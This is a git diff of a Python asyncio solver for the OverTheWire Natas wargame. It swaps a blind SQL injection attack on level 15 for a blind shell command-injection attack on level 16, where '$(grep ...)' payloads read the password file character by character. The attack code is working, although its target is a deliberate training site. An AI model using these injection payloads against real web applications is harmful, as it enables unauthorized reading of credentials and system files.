@@ -3,14 +3,14 @@ import asyncio
 from aiohttp import BasicAuth, ClientSession
 
 
-url = 'http://natas15.natas.labs.overthewire.org/index.php?username='
-auth = BasicAuth('natas15', natas15_pass)
+url = 'http://natas16.natas.labs.overthewire.org/index.php?needle={}password&submit'
+auth = BasicAuth('natas16', natas16_pass)
 
-async def check_user(sqli, data):
+async def search_string(search, data):
     async with ClientSession() as session:
-        async with session.get(url+sqli, auth=auth) as response:
+        async with session.get(url.format(search), auth=auth) as response:
             r = await response.text()
-            if 'This user exists.' in r:
+            if 'password' not in r:
                 return data
 
 async def get_charset():
@@ -18,8 +18,8 @@ async def get_charset():
     tasks = []
     charset = ''
     for char in alnum:
-        sqli = f'natas16" and password like binary "%{char}%'
-        tasks.append(asyncio.ensure_future(check_user(sqli, char)))
+        search = f'$(grep {char} /etc/natas_webpass/natas17)'
+        tasks.append(asyncio.ensure_future(search_string(search, char)))
     for task in asyncio.as_completed(tasks):
         if result := await task:
             charset += result
@@ -28,8 +28,8 @@ async def get_charset():
 async def get_substr(index, charset):
     tasks = []
     for char in charset:
-        sqli = f'natas16" and binary substr(password, {index+1}, 1)="{char}'
-        tasks.append(asyncio.ensure_future(check_user(sqli, char)))
+        search = f'$(egrep ^.{{{index}}}{char} /etc/natas_webpass/natas17)'
+        tasks.append(asyncio.ensure_future(search_string(search, char)))
         # Add delay to prevent too many simultaneous requests
         # Increase delay if receiving connection refused error
         # await asyncio.sleep(.01)
